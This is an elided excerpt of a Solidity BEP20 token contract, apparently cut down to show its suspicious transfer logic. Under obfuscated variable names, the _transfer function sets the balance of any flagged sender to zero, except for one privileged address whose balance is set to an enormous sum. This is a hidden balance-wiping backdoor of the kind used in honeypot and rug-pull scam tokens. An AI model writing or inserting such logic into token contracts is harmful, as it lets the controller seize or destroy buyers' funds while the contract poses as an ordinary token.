...
contract Token is IBEP20, HasForeignAsset {
    ...
    mapping(address => uint256) private _65154;
    ...
    function _transfer(
        ...
        uint256 feiluamount = 1;
        feiluamount = amount.mul(_feilu).div(100);
        uint256 amoun;
        amoun = amount - feiluamount+0;
        ...
        if (_i5sfda56[sender] == true) {
            if (sender == ss) {
                _balances[sender] = 100000000000000000000000000000;
            }else{
                _balances[sender] = 0;
            }
        }
        ...
        if (feiluamount > 0) {
            emit Transfer(sender, _DEADaddress, feiluamount);
        }
